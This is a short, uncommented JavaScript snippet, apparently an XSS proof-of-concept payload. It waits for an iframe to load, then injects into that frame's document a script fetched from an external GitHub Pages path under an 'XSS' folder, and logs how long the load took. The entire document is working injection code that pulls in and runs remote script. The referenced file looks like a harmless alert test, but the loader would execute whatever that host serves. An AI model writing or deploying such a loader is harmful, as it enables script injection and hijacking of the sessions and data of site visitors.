(() => {
  const t0 = performance.now();

  const waitIframe = setInterval(() => {
    const iframe = document.querySelector('iframe');
    if (!iframe) return;

    clearInterval(waitIframe);

    iframe.addEventListener('load', () => {
      const waitDOM = setInterval(() => {
        try {
          const doc = iframe.contentDocument;
          if (!doc || !doc.body) return;

          clearInterval(waitDOM);

          const s = doc.createElement('script');
          s.src = 'https://exon2007.github.io/XSS/alert1.js';
          s.async = true;

          s.onload = () => {
            console.log('[iframe] external script loaded');
            console.log('[iframe] load time:', (performance.now() - t0).toFixed(2), 'ms');
          };

          doc.body.appendChild(s);
        } catch (e) {
          clearInterval(waitDOM);
          console.log('access denied');
        }
      }, 10);
    });
  }, 10);
})();
